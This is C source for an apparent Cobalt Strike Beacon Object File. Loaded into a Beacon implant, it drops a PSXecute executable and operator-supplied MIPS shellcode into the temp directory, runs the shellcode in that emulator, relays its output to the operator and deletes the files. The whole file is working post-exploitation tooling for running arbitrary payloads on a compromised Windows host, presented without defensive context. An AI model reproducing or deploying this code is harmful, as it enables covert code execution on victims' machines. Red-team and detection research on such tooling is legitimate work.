#include "beacon.h"
#include <windows.h>

/* --------------------------------------------------------------------------- */
/* Declarations for DFR */
/* --------------------------------------------------------------------------- */
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CreateProcessA(
  IN LPCSTR lpApplicationName,
  IN OUT LPSTR lpCommandLine,
  IN LPSECURITY_ATTRIBUTES lpProcessAttributes,
  IN LPSECURITY_ATTRIBUTES lpThreadAttributes,
  IN BOOL bInheritHandles,
  IN DWORD dwCreationFlags,
  IN LPVOID lpEnvironment,
  IN LPCSTR lpCurrentDirectory,
  IN LPSTARTUPINFOA lpStartupInfo,
  OUT LPPROCESS_INFORMATION lpProcessInformation
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(
  IN HANDLE hObject
);

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(
  IN HANDLE hHandle,
  IN DWORD dwMilliseconds
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CreatePipe(
  OUT PHANDLE hReadPipe,
  OUT PHANDLE hWritePipe,
  IN LPSECURITY_ATTRIBUTES lpPipeAttributes,
  IN DWORD nSize
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(
  IN HANDLE hFile,
  OUT LPVOID lpBuffer,
  IN DWORD nNumberOfBytesToRead,
  OUT LPDWORD lpNumberOfBytesRead,
  IN OUT LPOVERLAPPED lpOverlapped
);

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetTempPath2A(
  IN  DWORD BufferLength,
  OUT LPSTR Buffer
);

DECLSPEC_IMPORT UINT WINAPI KERNEL32$GetTempFileNameA(
  IN  LPCSTR lpPathName,
  IN  LPCSTR lpPrefixString,
  IN  UINT   uUnique,
  OUT LPSTR  lpTempFileName
);

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(
  IN           LPCSTR                lpFileName,
  IN           DWORD                 dwDesiredAccess,
  IN           DWORD                 dwShareMode,
  IN LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  IN           DWORD                 dwCreationDisposition,
  IN           DWORD                 dwFlagsAndAttributes,
  IN HANDLE                hTemplateFile
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$SetFileInformationByHandle(
  IN HANDLE                    hFile,
  IN FILE_INFO_BY_HANDLE_CLASS FileInformationClass,
  IN LPVOID                    lpFileInformation,
  IN DWORD                     dwBufferSize
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$WriteFile(
  IN                HANDLE       hFile,
  IN                LPCVOID      lpBuffer,
  IN                DWORD        nNumberOfBytesToWrite,
  OUT     LPDWORD      lpNumberOfBytesWritten,
  IN OUT LPOVERLAPPED lpOverlapped
);

DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FlushFileBuffers(
  IN HANDLE hFile
);

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError();

/* --------------------------------------------------------------------------- */
/* HELPER METHODS */
/* --------------------------------------------------------------------------- */

BOOL WriteFileCustom(PCHAR filePath, PVOID pFileContents, DWORD fileSize) {
  // Open handle to it
  HANDLE hFile = KERNEL32$CreateFileA(
      filePath,
      GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
      0,
      NULL,
      CREATE_ALWAYS,
      FILE_ATTRIBUTE_TEMPORARY,
      NULL
  );
  if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open handle to file for writing: '%s'; error: %d\n", filePath, KERNEL32$GetLastError());
    return FALSE;
  }

  // Write contents to the file
  DWORD bytesWritten = 0;
  KERNEL32$WriteFile(
      hFile,
      pFileContents,
      fileSize,
      &bytesWritten,
      NULL
  );
  if (bytesWritten != fileSize) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Failed to write to: '%s'; error: %d\n", filePath, KERNEL32$GetLastError());
    return FALSE;
  }
  if(!KERNEL32$FlushFileBuffers(hFile)) {
    BeaconPrintf(CALLBACK_ERROR, "[-] Failed to flush file buffer for: '%s'; error: %d\n", filePath, KERNEL32$GetLastError());
    return FALSE;
  }
  KERNEL32$CloseHandle(hFile);

  BeaconPrintf(CALLBACK_OUTPUT, "[+] File written to: '%s'\n", filePath);
  return TRUE;
}

BOOL DeleteFileCustom(PCHAR filePath) {
  // Open handle to it
    HANDLE hFile = KERNEL32$CreateFileA(
        filePath,
        GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );
    if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
      BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open handle to file for deletion: '%s'; error: %d\n", filePath, KERNEL32$GetLastError());
      return FALSE;
    }

    // Set file to be deleted
    FILE_DISPOSITION_INFO fileDispositionInfo;
    fileDispositionInfo.DeleteFileA = TRUE;
    if(!KERNEL32$SetFileInformationByHandle(
        hFile,
        FileDispositionInfo,
        &fileDispositionInfo,
        sizeof(FILE_DISPOSITION_INFO)
    )) {
      BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set file disposition info on '%s'; error: %d\n", filePath, KERNEL32$GetLastError());
      return FALSE;
    }
    
    // Close file handle
    if (hFile != NULL)
       KERNEL32$CloseHandle(hFile);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] File deleted: '%s'\n", filePath);
    return TRUE;
}

DWORD StringLength(PCHAR pString) {
  DWORD length = 0;
  while (TRUE) {
    if (pString[length] == 0)
      return length;
    ++length;
  }
}

/* --------------------------------------------------------------------------- */
/* BOF Entry Point */
/* --------------------------------------------------------------------------- */
void go(char* args, int length) {
    // Parse inputs; get PSXecute.exe and payload
    datap parser;
	  BeaconDataParse(&parser, args, length);

    int psxecuteSize = 0;
    char* pPsxecuteContents = BeaconDataExtract(&parser, &psxecuteSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %d bytes PSXecute.exe loaded\n", psxecuteSize);

    int payloadSize = 0;
    char* pPayload = BeaconDataExtract(&parser, &payloadSize);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %d bytes MIPS-I 32-bit shellcode loaded\n", payloadSize);

    // Write process executable to a temporary location
    CHAR psxecuteTempFile[MAX_PATH] = "";
    CHAR payloadTempFile[MAX_PATH] = "";
    CHAR tempDir[MAX_PATH] = "";

    if (KERNEL32$GetTempPath2A(MAX_PATH, tempDir) == 0) return;
    if (KERNEL32$GetTempFileNameA(tempDir, "", 0, psxecuteTempFile) == 0) return;
    if (KERNEL32$GetTempFileNameA(tempDir, "", 0, payloadTempFile) == 0) return;

    if (!WriteFileCustom(psxecuteTempFile, pPsxecuteContents, psxecuteSize)) {
      return;
    }
    if (!WriteFileCustom(payloadTempFile, pPayload, payloadSize)) {
      DeleteFileCustom(psxecuteTempFile);
      return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] PSXecute written to: '%s'\n", psxecuteTempFile);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] MIPS shellcode written to: '%s'\n", payloadTempFile);

    // Create anonymous pipe to capture STDOUT from process
    SECURITY_ATTRIBUTES secAttr = {0};
    secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    secAttr.bInheritHandle = TRUE;
    secAttr.lpSecurityDescriptor = NULL;

    HANDLE hStdoutRead = NULL;
    HANDLE hStdoutWrite = NULL;

    if (!KERNEL32$CreatePipe(&hStdoutRead, &hStdoutWrite, &secAttr, 0)
      || hStdoutRead == NULL
      || hStdoutWrite == NULL
    ) {
      BeaconPrintf(CALLBACK_ERROR, "[+] Failed to create anonymous pipe to capture output from process\n");
      DeleteFileCustom(psxecuteTempFile);
      DeleteFileCustom(payloadTempFile);
      return;
    }

    // Launch process
    STARTUPINFOA startupInfo = {0};
    startupInfo.cb = sizeof(STARTUPINFOA);
    startupInfo.hStdOutput = hStdoutWrite;
    startupInfo.hStdError = hStdoutWrite;
    startupInfo.dwFlags |= STARTF_USESTDHANDLES;

    PROCESS_INFORMATION processInformation = {0};

    formatp commandLineFormatP = {0};
    BeaconFormatAlloc(&commandLineFormatP, MAX_PATH);

    BeaconFormatAppend(&commandLineFormatP, "\"", 1);
    BeaconFormatAppend(&commandLineFormatP, psxecuteTempFile, StringLength(psxecuteTempFile));
    BeaconFormatAppend(&commandLineFormatP, "\" ", 2);
    BeaconFormatAppend(&commandLineFormatP, payloadTempFile, StringLength(payloadTempFile));

    int commandLineLen = 0;
    PCHAR pCommandline = BeaconFormatToString(&commandLineFormatP, &commandLineLen);
    if(KERNEL32$CreateProcessA(
        psxecuteTempFile, // Image path
        pCommandline, // Command line
        NULL,
        NULL,
        TRUE,
        0, // Creation flags
        NULL, // Environment variables
        NULL, // Current directory
        &startupInfo,
        &processInformation
    )) {
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "[+] PSXecute VM launched; PID: %d, TID: %d; capturing output...\n",
            processInformation.dwProcessId,
            processInformation.dwThreadId
        );

        // Read process's STDOUT
        DWORD dwRead = 0;
        CHAR chBuf[100] = "";
        BOOL bSuccess = FALSE;

        KERNEL32$CloseHandle(hStdoutWrite);
        while(TRUE)
        {
            // Capture child's STDOUT and redirect it to Parent's STDOUT
            bSuccess = KERNEL32$ReadFile(hStdoutRead, chBuf, 100, &dwRead, NULL);
            if (!bSuccess || dwRead == 0) break;

            BeaconOutput(
                CALLBACK_OUTPUT,
                chBuf,
                dwRead
            );
        }

        // Wait for VM to exit
        KERNEL32$WaitForSingleObject(processInformation.hThread, INFINITE);
        BeaconPrintf(CALLBACK_OUTPUT, "%s", "[+] PSXecute VM exited");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] PSXecute VM failed to launch; error: %d\n", KERNEL32$GetLastError());
    };

    // Cleanup
    BeaconFormatFree(&commandLineFormatP);
    DeleteFileCustom(psxecuteTempFile);
    DeleteFileCustom(payloadTempFile);
    if (hStdoutRead != NULL)
       KERNEL32$CloseHandle(hStdoutRead);
    if (processInformation.hThread != NULL)
       KERNEL32$CloseHandle(processInformation.hThread);
    if (processInformation.hProcess != NULL)
      KERNEL32$CloseHandle(processInformation.hProcess);
}
